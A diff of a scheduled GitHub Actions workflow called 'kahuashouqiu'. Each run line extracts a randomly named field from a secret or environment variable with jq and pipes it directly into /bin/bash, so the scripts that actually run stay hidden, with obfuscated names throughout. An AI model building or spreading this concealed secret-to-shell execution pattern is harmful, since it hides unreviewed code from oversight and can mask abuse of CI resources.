@@ -2,35 +2,25 @@ name: kahuashouqiu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
-
-jobs:  # 13633
+    - cron: '11 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kahuashouqiu
         env:
-          xsi06: ${{ secrets.xsi06 }}
+          bzyc648: ${{ secrets.bzyc648 }}
         run: |
-          echo $xsi06 | jq -r .xqj67476 | /bin/bash
-          echo $g84 | jq -r .b77694 | /bin/bash
-          echo $jowxo7 | jq -r .xpas1363 | /bin/bash
-          echo $so3953 | jq -r .o00838 | /bin/bash
-          echo $t1 | jq -r .efyd98049 | /bin/bash
-          echo $yhede45640 | jq -r .zxq1 | /bin/bash
-          echo $hpb03107 | jq -r .iuive7345 | /bin/bash
-          echo $ih862 | jq -r .x34856 | /bin/bash
-          echo $cslr1 | jq -r .tetws10 | /bin/bash
-          echo $cn85377 | jq -r .ax849 | /bin/bash
-          echo $azo85 | jq -r .pabsv2889 | /bin/bash
-          echo $kjw400 | jq -r .txfp22 | /bin/bash
-          echo $uewlx8500 | jq -r .iv8 | /bin/bash
-          echo $iv86 | jq -r .fs079 | /bin/bash
-          echo $yxu5172 | jq -r .pybu173 | /bin/bash
-          echo $sdne20 | jq -r .o44884 | /bin/bash
-          echo $o55205 | jq -r .nck382 | /bin/bash
-          echo $fkeo7 | jq -r .qajip5 | /bin/bash
-          echo $p1 | jq -r .yif8439 | /bin/bash
+          echo $bzyc648 | jq -r .qunmm1 | /bin/bash
+          echo $sumn8906 | jq -r .wm90 | /bin/bash
+          echo $bj16553 | jq -r .nj0 | /bin/bash
+          echo $ntsbm0080 | jq -r .ox994 | /bin/bash
+          echo $d9476 | jq -r .etuma12 | /bin/bash
+          echo $df97 | jq -r .wepd80 | /bin/bash
+          echo $upel49 | jq -r .xewzj09 | /bin/bash
+          echo $prl75 | jq -r .dyn7 | /bin/bash
+          echo $ouya94767 | jq -r .q2 | /bin/bash
+          echo $l72 | jq -r .wlsxr5 | /bin/bash
+          echo $oqsfu3174 | jq -r .fow78944 | /bin/bash
 
